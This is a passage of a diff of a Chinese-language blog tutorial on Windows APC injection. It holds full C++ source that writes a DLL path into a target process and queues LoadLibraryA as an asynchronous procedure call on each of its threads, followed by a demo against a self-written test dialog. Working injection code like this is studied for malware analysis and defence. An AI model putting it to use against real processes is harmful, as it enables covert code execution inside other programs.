class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlstr.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPidByName</span><span class="params">(<span class="keyword">char</span>* pszProcessName)</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 PE32 = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(PE32) &#125;;</span><br><span class="line">    USES_CONVERSION;</span><br><span class="line">    CString ProcessName = <span class="built_in">A2T</span>(pszProcessName);</span><br><span class="line">    BOOL flag = <span class="built_in">Process32First</span>(hSnap, &amp;PE32);</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PE32.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="built_in">Process32Next</span>(hSnap, &amp;PE32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadIdLength = <span class="number">0</span>;</span><br><span class="line">    DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">    THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = TRUE;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 申请内存</span></span><br><span class="line">        pThreadId = <span class="keyword">new</span> DWORD[dwBufferLength];</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">        <span class="comment">// 获取线程快照</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in"><span class="keyword">sizeof</span></span>(te32));</span><br><span class="line">        te32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(te32);</span><br><span class="line">        hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == hSnapshot)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">        bRet = <span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line">        <span class="keyword">while</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">            <span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)</span><br><span class="line">            &#123;</span><br><span class="line">                pThreadId[dwThreadIdLength] = te32.th32ThreadID;</span><br><span class="line">                dwThreadIdLength++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">            bRet = <span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回</span></span><br><span class="line">        *ppThreadId = pThreadId;</span><br><span class="line">        *pdwThreadIdLength = dwThreadIdLength;</span><br><span class="line">        bRet = TRUE;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">            pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(<span class="keyword">char</span>* pszProcessName, <span class="keyword">char</span>* pszDllname)</span> </span>&#123;</span><br><span class="line">    BOOL flag = FALSE;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadLength = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pBaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pLoadLibraryFunc = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T dwRet = <span class="number">0</span>, dwDllPathLen = <span class="built_in">strlen</span>(pszDllname) + <span class="number">1</span>;</span><br><span class="line">    DWORD i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//获取进程的PID</span></span><br><span class="line">        dwPID = <span class="built_in">GetPidByName</span>(pszProcessName);</span><br><span class="line">        <span class="keyword">if</span> (dwPID == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取PID失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取所有线程ID</span></span><br><span class="line">        flag = <span class="built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);</span><br><span class="line">        <span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打开进程</span></span><br><span class="line">        hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//申请内存空间</span></span><br><span class="line">        pBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pBaseAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请空间失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向申请的空间写入内存</span></span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);</span><br><span class="line">        <span class="keyword">if</span> (dwRet != dwDllPathLen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pLoadLibraryFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向所有的线程插入APC函数</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwThreadLength; i++) &#123;</span><br><span class="line">            hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);</span><br><span class="line">            <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">                <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                hThread = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pThreadId) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">        pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL flag=<span class="built_in">Inject</span>(<span class="string">&quot;TestApc.exe&quot;</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flag == TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlconv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-function">DWORD <span class="hljs-title">GetPidByName</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName)</span> </span>&#123;<br>    HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    PROCESSENTRY32 PE32 = &#123; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PE32) &#125;;<br>    USES_CONVERSION;<br>    CString ProcessName = <span class="hljs-built_in">A2T</span>(pszProcessName);<br>    BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;PE32);<br>    <span class="hljs-keyword">while</span> (flag) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> PE32.th32ProcessID;<br>        &#125;<br>        flag = <span class="hljs-built_in">Process32Next</span>(hSnap, &amp;PE32);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">GetAllThreadIdByProcessId</span><span class="hljs-params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadIdLength = <span class="hljs-number">0</span>;<br>    DWORD dwBufferLength = <span class="hljs-number">1000</span>;<br>    THREADENTRY32 te32 = &#123; <span class="hljs-number">0</span> &#125;;<br>    HANDLE hSnapshot = <span class="hljs-literal">NULL</span>;<br>    BOOL bRet = TRUE;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">// 申请内存</span><br>        pThreadId = <span class="hljs-keyword">new</span> DWORD[dwBufferLength];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pThreadId)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(DWORD)));<br>        <span class="hljs-comment">// 获取线程快照</span><br>        <span class="hljs-built_in">RtlZeroMemory</span>(&amp;te32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32));<br>        te32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32);<br>        hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hSnapshot)<br>        &#123;<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取第一条线程快照信息</span><br>        bRet = <span class="hljs-built_in">Thread32First</span>(hSnapshot, &amp;te32);<br>        <span class="hljs-keyword">while</span> (bRet)<br>        &#123;<br>            <span class="hljs-comment">// 获取进程对应的线程ID</span><br>            <span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)<br>            &#123;<br>                pThreadId[dwThreadIdLength] = te32.th32ThreadID;<br>                dwThreadIdLength++;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历下一个线程快照信息</span><br>            bRet = <span class="hljs-built_in">Thread32Next</span>(hSnapshot, &amp;te32);<br>        &#125;<br>        <span class="hljs-comment">// 返回</span><br>        *ppThreadId = pThreadId;<br>        *pdwThreadIdLength = dwThreadIdLength;<br>        bRet = TRUE;<br><br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (FALSE == bRet)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pThreadId)<br>        &#123;<br>            <span class="hljs-keyword">delete</span>[]pThreadId;<br>            pThreadId = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">Inject</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName, <span class="hljs-keyword">char</span>* pszDllname)</span> </span>&#123;<br>    BOOL flag = FALSE;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadLength = <span class="hljs-number">0</span>;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    PVOID pBaseAddress = <span class="hljs-literal">NULL</span>;<br>    PVOID pLoadLibraryFunc = <span class="hljs-literal">NULL</span>;<br>    SIZE_T dwRet = <span class="hljs-number">0</span>, dwDllPathLen = <span class="hljs-built_in">strlen</span>(pszDllname) + <span class="hljs-number">1</span>;<br>    DWORD i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//获取进程的PID</span><br>        dwPID = <span class="hljs-built_in">GetPidByName</span>(pszProcessName);<br>        <span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取PID失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取所有线程ID</span><br>        flag = <span class="hljs-built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);<br>        <span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//打开进程</span><br>        hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>        <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//申请内存空间</span><br>        pBaseAddress = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>        <span class="hljs-keyword">if</span> (pBaseAddress == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请空间失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向申请的空间写入内存</span><br>        <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);<br>        <span class="hljs-keyword">if</span> (dwRet != dwDllPathLen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pLoadLibraryFunc = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pLoadLibraryFunc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向所有的线程插入APC函数</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwThreadLength; i++) &#123;<br>            hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);<br>            <span class="hljs-keyword">if</span> (hThread) &#123;<br>                <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);<br>                <span class="hljs-built_in">CloseHandle</span>(hThread);<br>                hThread = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br>        flag = TRUE;<br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (hProcess) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        hProcess = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pThreadId) &#123;<br>        <span class="hljs-keyword">delete</span>[]pThreadId;<br>        pThreadId = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL flag=<span class="hljs-built_in">Inject</span>(<span class="hljs-string">&quot;自己的文件路径&quot;</span>);<br>    <span class="hljs-keyword">if</span> (flag == TRUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
 
 <h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CTestApcDlg::OnBnClickedOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码	</span></span><br><span class="line">	<span class="built_in">SleepEx</span>(<span class="number">10000</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CTestApcDlg::OnBnClickedOk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加控件通知处理程序代码	</span><br>	<span class="hljs-built_in">SleepEx</span>(<span class="hljs-number">10000</span>, <span class="hljs-literal">true</span>);<br>	<span class="hljs-comment">//CDialogEx::OnOK();</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png"></p>
+<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后打开我们的注入程序，看到提示已经注入成功。</p>
-<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png"></p>
+<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>点击确定按钮，就会弹出我们在DLL里写好的弹窗。</p>
-<p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png"></p>
